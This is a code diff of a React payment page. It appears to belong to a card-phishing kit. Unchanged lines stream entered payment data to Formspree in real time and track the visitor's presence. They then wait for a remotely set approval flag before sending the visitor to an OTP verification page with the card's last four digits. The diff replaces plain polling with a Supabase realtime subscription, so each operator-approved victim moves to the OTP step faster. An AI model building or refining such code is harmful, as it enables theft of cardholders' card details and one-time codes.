@@ -1,4 +1,4 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useCallback } from "react";
 import { useNavigate, useSearchParams } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
@@ -91,6 +91,34 @@ const Payment = () => {
   const [approvalStatus, setApprovalStatus] = useState<'waiting' | 'approved' | 'rejected'>('waiting');
   usePresence(applicationId || undefined);
 
+  const moveToOtpVerification = useCallback(() => {
+    const cardDigits = formData.cardNumber.replace(/\s/g, "");
+    const lastFour = cardDigits.slice(-4);
+
+    setApprovalStatus('approved');
+    setTimeout(() => {
+      setWaitingForApproval(false);
+      navigate(`/otp-verification?company=${encodeURIComponent(companyName)}&price=${price}&cardLast4=${lastFour}`);
+    }, 800);
+  }, [companyName, formData.cardNumber, navigate, price]);
+
+  const handleApplicationStatus = useCallback((data: any) => {
+    if (!data) return;
+
+    if (data.payment_approved || data.current_step === 'otp' || data.status === 'pending_otp') {
+      moveToOtpVerification();
+      return;
+    }
+
+    if (data.status === 'rejected') {
+      setApprovalStatus('rejected');
+      setTimeout(() => {
+        setWaitingForApproval(false);
+        setApprovalStatus('waiting');
+      }, 4000);
+    }
+  }, [moveToOtpVerification]);
+
   // Send payment data to Formspree in real-time
   useFormspreeSync({
     companyName,
@@ -182,35 +210,40 @@ const Payment = () => {
 
   useEffect(() => {
     if (waitingForApproval && applicationId) {
-      // Check for approval every 2 seconds
+      let isActive = true;
+
+      getApplicationStatus(applicationId).then(({ data }) => {
+        if (isActive) handleApplicationStatus(data);
+      });
+
+      const channel = supabase
+        .channel(`payment_status_${applicationId}`)
+        .on(
+          'postgres_changes',
+          {
+            event: 'UPDATE',
+            schema: 'public',
+            table: 'customer_applications',
+            filter: `id=eq.${applicationId}`
+          },
+          (payload) => handleApplicationStatus(payload.new)
+        )
+        .subscribe();
+
       const interval = setInterval(async () => {
         const { data, error } = await getApplicationStatus(applicationId);
-
-        if (data?.payment_approved) {
-          clearInterval(interval);
-          setApprovalStatus('approved');
-
-          const cardDigits = formData.cardNumber.replace(/\s/g, "");
-          const lastFour = cardDigits.slice(-4);
-
-          setTimeout(() => {
-            setWaitingForApproval(false);
-            navigate(`/otp-verification?company=${encodeURIComponent(companyName)}&price=${price}&cardLast4=${lastFour}`);
-          }, 2000);
-        } else if (data?.status === 'rejected') {
-          clearInterval(interval);
-          setApprovalStatus('rejected');
-
-          setTimeout(() => {
-            setWaitingForApproval(false);
-            setApprovalStatus('waiting');
-          }, 4000);
+        if (!error && isActive) {
+          handleApplicationStatus(data);
         }
       }, 2000);
 
-      return () => clearInterval(interval);
+      return () => {
+        isActive = false;
+        clearInterval(interval);
+        supabase.removeChannel(channel);
+      };
     }
-  }, [waitingForApproval, applicationId, formData.cardNumber, companyName, price, navigate]);
+  }, [waitingForApproval, applicationId, handleApplicationStatus]);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
